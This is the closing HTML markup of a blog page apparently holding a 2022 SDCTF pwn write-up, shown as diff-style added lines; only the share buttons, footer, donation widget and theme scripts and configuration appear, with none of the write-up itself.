+  <a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://roderickchan.github.io/2022-sdctf-all-pwn-wp/" data-title="2022-Sdctf-All-Pwn-Wp"><svg class="icon" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>LINE</title><path d="M19.365 9.863c.349.0.63.285.63.631.0.345-.281.63-.63.63H17.61v1.125h1.755c.349.0.63.283.63.63.0.344-.281.629-.63.629h-2.386c-.345.0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63h2.386c.346.0.627.285.627.63.0.349-.281.63-.63.63H17.61v1.125h1.755zm-3.855 3.016c0 .27-.174.51-.432.596-.064.021-.133.031-.199.031-.211.0-.391-.09-.51-.25l-2.443-3.317v2.94c0 .344-.279.629-.631.629-.346.0-.626-.285-.626-.629V8.108c0-.27.173-.51.43-.595.06-.023.136-.033.194-.033.195.0.375.104.495.254l2.462 3.33V8.108c0-.345.282-.63.63-.63.345.0.63.285.63.63v4.771zm-5.741.0c0 .344-.282.629-.631.629-.345.0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63.346.0.628.285.628.63v4.771zm-2.466.629H4.917c-.345.0-.63-.285-.63-.629V8.108c0-.345.285-.63.63-.63.348.0.63.285.63.63v4.141h1.756c.348.0.629.283.629.63.0.344-.282.629-.629.629M24 10.314C24 4.943 18.615.572 12 .572S0 4.943.0 10.314c0 4.811 4.27 8.842 10.035 9.608.391.082.923.258 1.058.59.12.301.079.766.038 1.08l-.164 1.02c-.045.301-.24 1.186 1.049.645 1.291-.539 6.916-4.078 9.436-6.975C23.176 14.393 24 12.458 24 10.314"/></svg></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://roderickchan.github.io/2022-sdctf-all-pwn-wp/" data-title="2022-Sdctf-All-Pwn-Wp"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/pwn/" class="post-tag" title="Tags - pwn">pwn</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/2022-cyber-apocalypse-ctf-all-pwn-wp/" class="post-nav-item" rel="next" title="2022-Cyber-Apocalypse-CTF-All-Pwn-Wp">2022-Cyber-Apocalypse-CTF-All-Pwn-Wp<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div class="post-reward">
+    <div class="comment">Buy me a coffee~</div>
+    <input type="checkbox" class="reward-input" name="reward" id="fi-reward" hidden />
+    <label class="reward-button" for="fi-reward"><i class="fa-solid fa-qrcode fa-fw" aria-hidden="true"></i>Donate</label>
+    <div class="reward-ways" data-mode="fixed"><div><img src='/images/alipay.jpg' alt="roderick Alipay"><span data-animation>Alipay</span>
+          </div><div><img src='/images/wechatpay.jpg' alt="roderick WeChat Pay"><span data-animation>WeChat Pay</span>
+          </div></div>
+  </div><div id="comments"><div id="waline" class="comment"></div><noscript>
+        Please enable JavaScript to view the comments powered by <a href="https://waline.js.org/" rel="external nofollow noopener noreferrer">Waline</a>.
+      </noscript></div></article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><div class="follow-container">
+    <a href="https://www.roderickchan.cn" class="author-link" target="_blank">
+      <img src="https://gravatar.loli.net/avatar/6f579d9b68b13aed76b08fee1c3ede40?s=32&amp;d=mp" alt="roderick" class="author-avatar"> roderick
+    </a>
+    <a href="https://github.com/RoderickChan" class="follow-btn" target="_blank" title="Follow me on GitHub!">
+      <i class="fa-brands fa-github fa-fw fa-beat" aria-hidden="true"></i> Follow
+    </a>
+  </div>
+  <hr class="hr-edge-weak"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="clustrmaps-custom">
+    <center>
+<script type='text/javascript' id='clustrmaps' src='//cdn.clustrmaps.com/map_v2.js?cl=ffffff&w=600&t=tt&d=bKrzPRSdAZuPQnsWUdvwNdyX5hI0m3cpvARXwWbJct4'></script>
+    </center>
+</div><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.147.7"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.21-87ca54d0"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="https://www.roderickchan.cn"target="_blank" rel="external nofollow noopener noreferrer">roderick</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span></div><div class="footer-line statistics"><span class="site-time" title='Website running ...'><i class="fa-solid fa-heartbeat fa-fw animate-icon" aria-hidden="true"></i><span class="run-times ms-1">Website running ...</span></span></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='Total visitors'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Total visits'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div><div class="footer-line beian"><span class="icp footer-divider"><a href="http://beian.miit.gov.cn/">鄂ICP备2022016286号</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div><div class="fixed-button view-comments d-none" role="button" aria-label="View Comments"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><a href="https://github.com/RoderickChan" title="View source on GitHub"target="_blank" rel="external nofollow" class="github-corner right d-none-mobile"><svg viewBox="0 0 250 250" aria-hidden="true" width="56" height="56"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;--bg-progress: #000;--bg-progress-dark: #fff;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/waline/waline.css"><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/waline/waline.umd.js" defer></script><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/algoliasearch/algoliasearch-lite.umd.min.js" defer></script><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="https://vercount.one/js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"Copy to clipboard","maxShownLines":-1},"comment":{"enable":true,"expired":false,"waline":{"copyright":true,"dark":"html[data-theme='dark']","el":"#waline","emoji":["//unpkg.com/@waline/emojis@1.1.0/weibo"],"highlighter":true,"imageUploader":true,"lang":"en","login":"enable","meta":["nick","mail","link"],"pageSize":10,"reaction":true,"search":false,"serverURL":"https://waline.roderickchan.cn/","texRenderer":false}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"enablePWA":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"pangu":{"enable":true,"selector":"article"},"search":{"algoliaAppID":"6CJ87MRD62","algoliaIndex":"index.en","algoliaSearchKey":"9f68a62dba71402a82f37137a7a886d2","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"},"siteTime":"2022-10-01T09:00:00+08:00","twemoji":true,"typeit":{"cursorChar":"|","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.21-87ca54d0","watermark":{"colspacing":30,"content":"roderick' blog","enable":true,"fontfamily":"inherit","fontsize":0.85,"height":21,"opacity":0.0125,"rotate":15,"rowspacing":60,"width":150}};</script><script src="/js/theme.min.js" defer></script><script src="/lib/translate.min.js" defer></script><script>window.ATConfig={"hugoLangCodes":["en"],"hugoLangMap":{"en":"/2022-sdctf-all-pwn-wp/"}};</script><script src="/js/translate.fixit.min.js" defer></script></body>
+</html>
